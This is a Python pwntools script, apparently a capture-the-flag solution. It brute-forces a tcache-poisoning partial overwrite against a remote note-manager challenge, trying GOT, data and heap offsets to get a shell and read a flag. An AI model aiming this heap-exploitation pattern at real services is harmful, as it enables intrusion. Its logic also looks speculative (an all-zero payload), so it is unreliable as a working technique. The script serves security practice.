#!/usr/bin/env python3
"""
Brute force approach - try partial overwrites with different values
Since ASLR only randomizes some bits, we can brute force them
"""

from pwn import *
import sys

elf = ELF('./chal', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

context.binary = elf
context.log_level = 'warn'

def attempt_exploit(target_low_bytes):
    try:
        io = remote('amt.rs', 26797, level='error')

        def create(idx, size, data):
            io.sendlineafter(b'operation: ', b'1')
            io.sendlineafter(b'note: ', str(idx).encode())
            io.sendlineafter(b'size: ', hex(size).encode())
            io.sendafter(b'data: ', data)

        def delete(idx):
            io.sendlineafter(b'operation: ', b'2')
            io.sendlineafter(b'note: ', str(idx).encode())

        # Quick setup
        create(0, 0x88, b'/bin/sh\x00' + b'A' * 0x80)
        create(1, 0x88, b'B' * 0x88)
        create(2, 0x88, b'C' * 0x88)

        delete(1)
        delete(2)

        # Tcache poisoning with partial overwrite
        create(2, 0x88, p16(target_low_bytes) + b'\x00' * (0x88 - 2))

        # Allocate
        create(3, 0x88, b'D' * 0x88)

        # Try to allocate at target
        payload = p64(0) * 16  # Overwrite with controlled data
        create(4, 0x88, payload[:0x88])

        # Trigger
        io.sendline(b'cat flag.txt')
        io.sendline(b'999')
        io.sendline(b'0')

        # Check for flag
        output = io.recvall(timeout=1)

        if b'amateursCTF{' in output or b'flag{' in output:
            log.success(f"FLAG FOUND with target={hex(target_low_bytes)}: {output}")
            return True

        io.close()
        return False

    except Exception as e:
        try:
            io.close()
        except:
            pass
        return False

# Brute force targets
log.info("Starting brute force attack...")

targets = [
    0x4040,  # notes array
    0x4000,  # .data start
    0x3fc0,  # scanf@got
    0x3fd0,  # malloc@got
    0x5000,  # Possible heap locations
    0x5040,
    0x5080,
    0x50c0,
]

for target in targets:
    log.info(f"Trying target: {hex(target)}")
    if attempt_exploit(target):
        log.success("Exploit succeeded!")
        sys.exit(0)

# Try random offsets
for i in range(0x4000, 0x6000, 0x40):
    if i % 0x400 == 0:
        log.info(f"Progress: {hex(i)}")

    if attempt_exploit(i):
        log.success(f"Exploit succeeded with offset: {hex(i)}")
        sys.exit(0)

log.error("Brute force failed")
